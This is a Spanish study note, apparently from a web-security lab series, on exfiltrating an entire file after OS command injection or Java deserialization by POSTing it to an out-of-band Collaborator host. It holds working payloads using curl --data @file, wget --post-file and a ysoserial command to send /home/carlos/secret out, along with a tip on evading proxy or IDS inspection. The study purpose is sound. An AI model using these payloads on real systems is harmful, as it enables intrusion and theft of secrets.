---
aliases:
  - OS Command Injection 006 - exfil archivo completo
  - exfil file out-of-band
  - wget post-file
  - curl data file
tags:
  - vuln/os-command-injection
  - example
  - technique
---

# 006 — Exfil de un archivo entero (POST out-of-band) ⭐

> Técnica **transversal** (no hay lab dedicado): aplica a cualquier RCE — command injection **o** [deserialización](vulnerabilities/013-insecure_deserialization/). Base → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]]

## ¿Por qué acá? (cuando el dato no entra en un DNS)
- **En 005 metías la salida de `whoami` en un subdominio.** Eso sirve para un dato **corto** y con **chars válidos de DNS**.
- **Un secreto real es un archivo entero** (`/home/carlos/secret`, un token, una key): tiene saltos, largo > 63 chars, chars raros → **no cabe** en un label DNS.
- **Solución "pro":** en vez de meter el dato en el *nombre*, **POSTeás el archivo completo** en el **body** de una request HTTP hacia tu Collaborator. Sin límite de largo ni de charset.

## Cómo explotarlo

### Opción A — `curl --data @archivo`
El `@` le dice a curl "leé el contenido de este archivo y mandalo como body":
```
||curl+--data+@/home/carlos/secret+https://TU-SUBDOMINIO.oastify.com||
```

### Opción B — `wget --post-file archivo`
Equivalente con wget:
```
"`` /usr/bin/wget --post-file /home/carlos/secret https://TU-SUBDOMINIO.oastify.com ``"
```

### Cómo lo leés
En **Collaborator → Poll now** → mirás la interacción **HTTP**: el **body del POST** trae el contenido **completo** del archivo. Ese es el botín.

## Dónde aparece esto además de command injection
- **Deserialización Java (ysoserial):** el gadget corre un comando del SO igual que acá. Ej. con `CommonsCollections7`:
  ```
  java -jar ysoserial.jar CommonsCollections7 'curl --data @/home/carlos/secret TU-COLLABORATOR' | base64
  ```
  Mismo objetivo (sacar `/home/carlos/secret`), distinto vehículo → carpeta `vulnerabilities/013-insecure_deserialization/` (JAVA).

## Verificación
- Llega una request **HTTP** (no solo DNS) al Collaborator, y su **body** es el archivo → exfil completa.

## Detalles que se pasan por alto
- **Necesita HTTP saliente permitido.** Si solo sale DNS, volvé a 005 y trocealo/base64 (más tedioso, pero es lo único que pasa el firewall).
- **`--data @file` (curl) vs `--data-binary @file`:** `--data` puede comer saltos de línea; si el archivo es binario o importa el formato exacto, usá `--data-binary`.
- **HTTPS al Collaborator** evita que un proxy/IDS que mira texto plano se dé cuenta.
- **Es el mismo primitivo que el SSRF→RCE:** una vez que ejecutás comandos, el canal de salida (DNS corto vs HTTP completo) lo elegís según lo que el egress te deje.

→ Fin de la serie. Volver al [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]].
